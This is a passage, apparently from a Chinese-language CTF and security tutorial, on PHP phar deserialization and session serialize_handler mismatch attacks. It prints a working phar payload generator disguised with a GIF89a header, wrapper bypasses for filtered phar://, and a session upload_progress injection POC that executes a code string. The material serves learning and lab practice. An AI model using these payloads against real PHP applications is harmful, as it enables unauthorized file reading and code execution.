+看到的sql语句的参数都被绑定，所以sql注入走不通
+
+#### 构造利用链
+
+看到了file_get_contents()函数，可以文件读取，找到在user类的destruct()函数调用了此函数，  
+但是没有回显，所以找找可以回显的地方，在FileList类有 **call()函数把$file->$func()的值放到result,然后在destruct()函数输出出来，**call()是上面说过是访问不存在的方法时调用，所以这条链就很明显了，先user->destruct()读取FileList的close()函数，因为读不到所以执行
+**call()函数，在call函数内使$file为$File类，$func为close()，然后file_get_contents()取到值后放入$result最后在进程结束时**
+destruct()把result打印出来。  
+注：我一直在疑惑为什么$func不用总结给他赋值为close()，查了一下
+**call函数，_call方法有2个参数，method和param，对应真实的方法名字和参数。所以再总结一次这里就是先在user类的destruct()函数读FileList类的close(),因为不存在所以调用**
+call()，在call里可以使$file->$func为$File->close(),所以成功调用file_get_contents(),返回结果放在result并输出。
+
+但是这里找不到unserialize()反序列化函数，应该是可以使用phar反序列化
+
+### phar反序列化前置知识
+
+phar反序列化即在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。  
+具体文章<https://paper.seebug.org/680/>  
+首先了解一下phar文件的结构，一个phar文件由四部分构成：
+
+  * a stub：可以理解为一个标志，格式为xxx<?php xxx; **HALT_COMPILER();? >，前面内容不限，但必须以**HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。
+  * a manifest describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。
+  * the file contents：被压缩文件的内容。
+  * [optional] a signature for verifying Phar integrity (phar file format only)：签名，放在文件末尾
+
+通俗的理解就是php文件系统很大一部分函数经过phar://解析时，存在着对meta-data（在这里<meta-data>区域面搞反序列化的pop链）反序列化的操做。</meta-data>
+
+#### phar利用条件
+
+1、phar文件可上传  
+2、文件流操作函数如file_exists(),file_get_contents()等影响函数要有可利用的魔术方法做跳板  
+3、文件流参数可控，且phar://没有被过滤，或可绕过
+
+#### 影响函数
+
+![](./img/6385403007246449215.png)
+
+#### 绕过方法
+
+（1）phar://被过滤  
+有以下几种方法可以绕过：
+
+  * compress.bzip2://phar://
+  * compress.zlib://phar:///
+  * php://filter/resource=phar://
+  * $z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
+
+（2）除此之外，我们还可以将phar伪造成其他格式的文件。  
+php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：
+
+### 实际利用
+
+生成payload
+
+    
+    
+    <?php
+    class User {
+        public $db;
+        public function __construct(){
+            $this->db=new FileList();
+        }
+    }
+    
+    class FileList {
+        private $files;
+        private $results;
+        private $funcs;
+        public function __construct(){
+            $this->files=array(new File());
+            $this->results=array();
+            $this->funcs=array();
+        }
+    }
+    
+    class File {
+        public $filename="/flag.txt";
+    }
+    
+    $user = new User();
+    $phar = new Phar("shell.phar"); //生成一个phar文件，文件名为shell.phar
+    $phar-> startBuffering();
+    $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); //设置stub
+    $phar->setMetadata($user); //将对象user写入到metadata中
+    $phar->addFromString("shell.txt","haha"); //添加压缩文件，文件名字为shell.txt,内容为haha
+    $phar->stopBuffering();
+
+最后把文件上传后在删除文件处抓包，?filename=phar://shell.jpg即可，这里文件上传还要改改文件类型和文件名绕过
+
+## 5.session反序列化
+
+### 前置知识
+
+理解php的session之前先了解一下session是什么，这里引用百度的描述，比较官方  
+**Session：**  
+在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的
+Web页时，如果该用户还没有会话，则Web服务器将自动创建一个 Session对象。当会话过期或被放弃后，服务器将终止该会话。Session
+对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在Session对象中。不过不同语言的会话机制可能有所不同。
+
+**PHP session：**  
+可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session
+变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与
+cookie的主要区别，所以seesion 的安全性相对较高。
+
+**session的工作流程：**  
+当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session
+ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session
+ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion
+ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session
+ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。
+
+**seesion_start()的作用：**  
+当会话自动开始或者通过 session_start() 手动开始的时候， PHP
+内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到
+$_SESSION
+超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。
+
+**php.ini中一些Session配置：**  
+1、session.save_path="" --设置session的存储路径  
+2、session.save_handler=""--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)  
+3、session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动  
+4、session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php
+
+**常见的php-session存放位置有** ：  
+1、/var/lib/php5/sess_PHPSESSID  
+2、/var/lib/php7/sess_PHPSESSID  
+3、/var/lib/php/sess_PHPSESSID  
+4、/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED  
+5、phpstudy集成环境下在php.ini里查找session.save_path，也可以在这里更改路径
+
+**session.serialize_handler定义的引擎有三种，如下表所示：**
+
+**处理器名称** | **存储格式**  
+---|---  
+php | 键名 + 竖线 + 经过serialize()函数序列化处理的值  
+php_binary | 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值  
+php_serialize | 经过serialize()函数序列化处理的数组  
+  
+**注：自 PHP 5.5.4 起可以使用 _php _serialize_**  
+上述三种处理器中，php_serialize在内部简单地直接使用 serialize/unserialize函数，并且不会有php和
+php_binary所具有的限制。 使用较旧的序列化处理器导致$_SESSION 的索引既不能是数字也不能包含特殊字符(| 和 !) 。  
+注：查看版本，注意：在php 5.5.4以前默认选择的是php，5.5.4之后就是php_serialize,这里面是php_serialize,同时意识到
+在index界面的时候，设置选择的是php，因此可能会造成漏洞  
+下面我们实例来看看三种不同处理器序列化后的结果。
+
+    
+    
+    <?php
+    ini_set('session.serialize_handler', 'php');
+    //ini_set("session.serialize_handler", "php_serialize");
+    //ini_set("session.serialize_handler", "php_binary");
+    session_start();
+    $_SESSION['lemon'] = $_GET['a'];
+    echo "<pre>";
+    var_dump($_SESSION);
+    echo "</pre>";
+
+比如这里我get进去一个值为abc,查看一下各个存储格式：
+
+  * php : lemon|s:3:"abc"; 
+  * php_serialize : a:1:{s:5:"lemon";s:3:"abc";} 
+  * php_binary : lemons:3:"abc";
+
+这有什么问题，其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如：使用不同引擎来处理session文件。
+
+### 漏洞造成原理：
+
+前面的前置知识没理解没关系，我们直接先看看漏洞如何造成的，这里涉及的其实是这两个处理器  
+//ini_set('session.serialize_handler', 'php');  
+//ini_set("session.serialize_handler", "php_serialize");  
+当php_serialize处理器处理接收session，php处理器处理session时便会造成反序列化的可利用，因为php处理器是有一个|间隔符，当php_serialize处理器传入时在序列化字符串前加上|，|O:7:"xiaoxin":1:{s:4:"name";s:7:"xiaoxin";}"  
+此时session值为 **
+_a:1:{s:7:"session";s:44:"|O:7:"xiaoxin:1:{s:4:"name";s:7:"xiaoxin";}";}_**
+当php处理器处理时，会把|当作间隔符，取出后面的值去反序列化，即是我们构造的payload： **
+_|O:7:"xiaoxin:1:{s:4:"name";s:7:"xiaoxin";}"_**
+
+### 简单实例
+
+这里拿个简单的实例代码来加深理解  
+定义一个session.php用于接收session  
+![](./img/2208473990369318508.png)![](./img/1550196818388334290.png)  
+这两个文件作用很清晰，他们的php处理器不一样，session.php用于接收get请求的session值，class.php反序列前会输出“未反序列化”，反序列化后会输出name值，这里我们构造|加序列化字符使class输出name值，则说明反序列化成功  
+先访问session.php,看看自动获取的session![](./img/4827202554150724697.png)  
+构造payload  
+![](./img/5757492620749144531.png)  
+获得payload：|O:7:"Xiaoxin":1:{s:4:"name";s:18:"反序列化成功";}  
+在session.php访问并传入参数，在session文件里面可以看到session值已改变![](./img/4565461714523392884.png)  
+直接访问class.php，就会成功执行反序列化漏洞  
+![](./img/2197700686267789910.png)  
+不过这只是简单的一个示例，没有考虑到如何控制session的问题，下面找一道ctf题深入学习一下。
+
+### **Jarvis OJ——PHPINFO**
+
+题目找不到了，本地复现一下，可能和题目有点不一样，环境有问题没执行成功，帮助理解就好了  
+**upload_process机制：**  
+实战中没有$_SESSION变量赋值时，在PHP中还存在一个upload_process机制，即自动在$_SESSION中创建一个键值对，值中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用session实时返回上传的进度。在session.upload_process.enabled开启时会启用这个功能，在php.ini中会默认启用这个功能。  
+**利用方法：**  
+本地搭建一个表单提交的html文件，上传文件时，如果 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的变量，就可以将
+filename 的值赋值到session 中，filename 的值如果包含双引号，还需要进行转义，最后 Session
+就会保存上传的文件名。如果没有提供写入 Session 的地方，可以用这种方法。具体利用看下面构造poc  
+**源码：**  
+![](./img/2042488213195322473.png)  
+看到ini_set('session.serialize_handler','php');我们就可以猜测这道题应该是考php的session反序列化  
+当我们随便传入一个值时，便会触发__construct()魔法函数，从而出现phpinfo页面，我们便可以在phpinfo收集信息  
+![](./img/7662030224103839522.png)  
+漏洞产生原理：这里可以看到默认处理器（序列化处）是php_serialize，但是题目index.php处(也就是反序列化处)使用的是php处理器，经过前面的简单示例可以知道这里因为session的序列化和反序列化的处理器不同，会导致反序列化漏洞，但是这里没有可以控制session的参数，所以我们可以利用upload_process机制写入session后自动反序列化即会返回命令执行的结果  
+这里的参数session.upload_progress.enabled为on，所以可以使用php的upload_process机制，可以通过上传文件，从而在session文件中写入数据  
+构造序列化payload：
+
+    
+    
+    <?php
+    ini_set('session.serialize_handler', 'php_serialize');
+    session_start();
+    class OowoO
+    {
+        public $mdzz='print_r(scandir(dirname(__FILE__)));';
+    }
+    $obj = new OowoO();
+    echo serialize($obj);
+    ?>
+
+生成payload：O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname( **FILE**
+)));";}  
+为防止双引号被转义，在双引号前加上\，除此之外还要加上|  
+|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname( **FILE**
+)));\";}  
+构造poc：  
+（本地搭建个提交表单，地址记得改一下）
+
+    
+    
+    <form action="http://127.0.0.1/php_serialize/index.php" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+        <input type="file" name="file" />
+        <input type="submit" />
+    </form>
+
+抓包![](./img/7822357885355230591.png)  
+修改filename和Content-Type![](./img/4022310658339559567.png)  
+这样子构造数据包查看返回包就能看到反序列化后的内容，这里引用文章的图片，本地搭建没复现成功，文章链接在文末![](./img/5421041572522197856.png)  
+可以看到反序列化成功，命令执行成功，接下来拿flag的步骤我就省略了，本地搭建没flag。
+
+参考文章：  
+<https://www.freebuf.com/articles/web/167721.html>  
+<https://www.cnblogs.com/zzjdbk/p/12995217.html>  
+<https://xz.aliyun.com/t/6640#toc-10>  
+<https://www.jianshu.com/p/fba614737c3d>  
+<https://xz.aliyun.com/t/7366>  
+<https://blog.csdn.net/qq_45521281/article/details/107135706>  
+<https://blog.csdn.net/qq_43622442/article/details/105751356>
+
